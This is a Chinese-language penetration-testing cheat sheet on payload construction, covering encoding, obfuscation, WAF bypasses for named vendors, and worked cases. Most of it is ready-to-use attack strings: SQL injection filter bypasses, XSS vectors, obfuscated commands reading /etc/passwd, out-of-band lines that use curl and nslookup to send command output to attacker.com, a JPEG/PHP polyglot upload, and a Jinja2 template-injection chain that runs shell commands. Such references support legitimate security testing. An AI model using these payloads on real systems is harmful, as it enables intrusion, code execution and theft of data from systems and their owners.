# Payload 构造技术

## 技术概述
Payload 是渗透测试中用于探测、验证和利用漏洞的核心数据载体。高质量的 Payload 构造需要理解目标漏洞的底层机制、目标系统的处理逻辑以及防御机制的过滤规则。本文件总结了通用的 Payload 构造方法、编码技术和 WAF 绕过策略。

Payload 构造的核心原则：
- **精确性**：针对特定漏洞类型和上下文定制 payload
- **最小化**：使用最简单有效的 payload 验证漏洞存在
- **安全性**：仅验证利用可能性，不造成实际损害
- **隐蔽性**：绕过检测机制完成验证
- **可复现性**：在相同条件下稳定触发

## 编码方法

### 1. URL 编码 (Percent-Encoding)
将特殊字符转换为 `%XX` 格式（XX 为字符的十六进制 ASCII 值）。

| 字符 | URL 编码 | 说明 |
|------|---------|------|
| 空格 | `%20` 或 `+` | 查询参数中 `+` 等价于空格 |
| `'` | `%27` | SQL 注入常用 |
| `"` | `%22` | JSON/HTML 注入常用 |
| `<` | `%3C` | XSS 常用 |
| `>` | `%3E` | XSS 常用 |
| `&` | `%26` | 参数分隔符 |
| `=` | `%3D` | 赋值符号 |
| `#` | `%23` | 锚点/注释 |
| `/` | `%2F` | 路径分隔符 |
| `.` | `%2E` | 路径遍历常用 |
| `;` | `%3B` | 命令分隔符 |
| `|` | `%7C` | 管道符 |
| `` ` `` | `%60` | 命令替换 |

### 2. 双重/多重 URL 编码
当后端多次解码 URL 时，对 payload 进行多次编码。

```
原始: ' OR 1=1 --
单次编码: %27%20OR%201%3D1%20--
双重编码: %2527%2520OR%25201%253D1%2520--
三重编码: %252527%252520OR%2525201%25253D1%252520--
```

### 3. Base64 编码
将二进制数据编码为 ASCII 字符（A-Z, a-z, 0-9, +, /, =）。

**适用场景**：
- JWT payload 编码
- 绕过简单的字符串过滤
- 命令注入：`echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash`
- XML/SOAP 攻击中的二进制数据嵌入

**变体**：
- **URL-safe Base64**：`+` → `-`, `/` → `_`
- **Base64 URL decode bypass**：某些 WAF 不解码 Base64 内容

### 4. 十六进制编码
**SQL 注入**：字符串转为十六进制
```sql
-- 原始
SELECT * FROM users WHERE name = 'admin'
-- 十六进制编码
SELECT * FROM users WHERE name = 0x61646d696e
```

**命令注入**：使用十六进制转义
```bash
$'\x63\x61\x74' /etc/passwd  # cat /etc/passwd
```

### 5. Unicode 编码
**HTML 实体编码**（XSS 绕过）：
```
< → &lt; 或 &#60; 或 &#x3c;
> → &gt; 或 &#62; 或 &#x3e;
" → &quot; 或 &#34; 或 &#x22;
' → &#39; 或 &#x27;
& → &amp; 或 &#38; 或 &#x26;
```

**JavaScript Unicode 转义**：
```javascript
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**UTF-7 编码**（旧版浏览器）：
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

### 6. 双重/混合编码
组合多种编码方式以绕过多层次过滤：
```
原始: <script>alert(1)</script>
HTML 实体 + URL: %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
Unicode + URL: %5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e
```

### 7. 特殊编码技巧
- **SQL 字符串拼接**：`'adm'+'in'`, `CONCAT('a','d','min')`
- **SQL 十六进制字符串**：`0x61646d696e`
- **SQL CHAR 函数**：`CHAR(97,100,109,105,110)`
- **Python 字符串拼接**：`"ad"+"min"`, `"".join(["a","d","min"])`
- **JavaScript 字符串**：`"ad"+"min"`, `String.fromCharCode(97,100,109,105,110)`

## 混淆技巧

### 1. 大小写混写
```sql
SeLeCt * FrOm users WhErE id = 1
```

### 2. 空白符替换
```sql
-- 原始: UNION SELECT
UNION    SELECT          -- 多个空格
UNION%09SELECT           -- Tab
UNION%0ASELECT           -- 换行
UNION%0DSELECT           -- 回车
UNION%0CSELECT           -- 换页
UNION/**/SELECT          -- 注释
UNION/*!50000SELECT*/    -- MySQL 版本特定注释
```

### 3. 注释插入
```sql
SEL/*comment*/ECT col FR/*comment*/OM table
SEL/**/ECT/**/1/**/FR/**/OM/**/dual
```

### 4. 等价替换
| 原关键词 | 等价替代 |
|---------|---------|
| `=` | `LIKE`, `REGEXP`, `BETWEEN`, `<=>` |
| `AND` | `&&`, `AND 1` |
| `OR` | `||` |
| `SPACE` | `()`, `/**/`, `%09`, `%0A` |
| `SUBSTRING()` | `MID()`, `LEFT()`, `RIGHT()` |
| `CONCAT()` | `CONCAT_WS()`, `GROUP_CONCAT()` |
| `SLEEP()` | `BENCHMARK()`, `GET_LOCK()` |
| `information_schema` | `mysql.innodb_table_stats` (MySQL 8.0+) |

### 5. 命令注入混淆
```bash
# 变量拼接
A=c;B=at;C=/etc/passwd;$A$B $C

# 反斜杠插入
c\at /e\tc/pa\ssw\d

# 通配符
/b?n/c?t /e??/p??s?d

# Base64 解码执行
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# 花括号展开
{cat,/etc/passwd}

# 命令替换
cat $(echo L2V0Yy9wYXNzd2Q= | base64 -d)
```

### 6. XSS 混淆
```html
<!-- 标签内事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 特殊标签 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- JavaScript 编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>

<!-- 大小写和空格变体 -->
<IMG SRC=x ONERROR="alert(1)">
<script> alert ( 1 ) </script>
```

## WAF 绕过策略

### 1. HTTP 层面的 WAF 绕过
| 技术 | 说明 |
|------|------|
| **分块传输** | `Transfer-Encoding: chunked` — WAF 可能不重组分块 body |
| **HTTP 走私** | 利用 `Content-Length` 和 `Transfer-Encoding` 不一致 |
| **请求头污染** | `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL` |
| **多部分边界操纵** | 修改 `boundary` 格式绕过 body 解析 |
| **Content-Type 操纵** | `text/plain; charset=UTF-7` |
| **编码声明** | `Content-Type: application/json; charset=UTF-32` |
| **请求拆分** | 将 payload 分布在多个参数或请求中 |

### 2. 参数级绕过
| 技术 | 说明 |
|------|------|
| **HTTP 参数污染 (HPP)** | `id=1&id=2` — 后端取第一个/最后一个/合并 |
| **JSON 数组注入** | `{"id": [1, 2]}` — 后端取数组的第一个元素 |
| **嵌套参数** | `data[id]=1` vs `id=1` — 不同解析路径 |
| **HTTP 参数注入 (HPF)** | 在参数值中注入额外参数名 |

### 3. 语义级绕过
| 技术 | 说明 |
|------|------|
| **同义词替换** | 用等价但不同的语法表达相同含义 |
| **逻辑重构** | 改变表达结构但保持语义 |
| **间接引用** | 通过变量/函数间接传递 payload |
| **延迟执行** | 存储 payload 后在另一上下文触发 |

### 4. 框架特定绕过
| WAF/框架 | 绕过技术 |
|---------|---------|
| **ModSecurity** | 使用 `%0A` 换行分割关键词、内联注释 |
| **Cloudflare** | 利用 HTTP/2 特性、分块传输、特殊编码 |
| **AWS WAF** | 参数污染、Unicode 规范化差异 |
| **Imperva** | JSON 嵌套绕过、空白符替换 |
| **Baidu WAF** | 双重编码、注释插入 |

## 实际应用案例

### 案例 1: SQL 注入 Payload 构造
**目标**：绕过关键词过滤提取数据库名
```
原始: ' UNION SELECT database() --
绕过 1: '/**/UnIoN/**/SeLeCt/**/database()/**/--
绕过 2: ' UNION%0ASELECT%0Adatabase()%23
绕过 3: ' uNiOn sElEcT (SELECT database())--
绕过 4: ' UNION ALL SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--
```

### 案例 2: XSS Payload 构造（长度限制 30 字符）
```
目标: 在 30 字符限制下执行 alert(1)

Payload 1: <svg/onload=alert(1)>           (23 字符)
Payload 2: <img/src=x onerror=alert(1)>    (28 字符)
Payload 3: <body/onload=alert(1)>          (22 字符)
Payload 4: <sVg/OnLoAd=alert`1`>           (22 字符, 反引号替代括号)
```

### 案例 3: 命令注入 OOB Payload
**目标**：通过 DNS 解析带外验证命令执行
```
原始: ; cat /etc/passwd
OOB DNS: ; nslookup $(cat /etc/passwd | base64).attacker.com
OOB HTTP: ; curl http://attacker.com/$(whoami)
OOB HTTP POST: ; curl -X POST -d "$(id)" http://attacker.com/collect
```

### 案例 4: 文件上传 Polyglot
**目标**：同时满足 JPEG 和 PHP 文件格式
```
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 ... (JPEG header)
... [JPEG image data] ...
<?php phpinfo(); ?> (PHP code appended)
```

### 案例 5: 模板注入 Payload 链（Jinja2）
```
探测: {{7*7}} → 49
对象探测: {{self}} → 返回模板对象
Gadget 链: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
简化: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
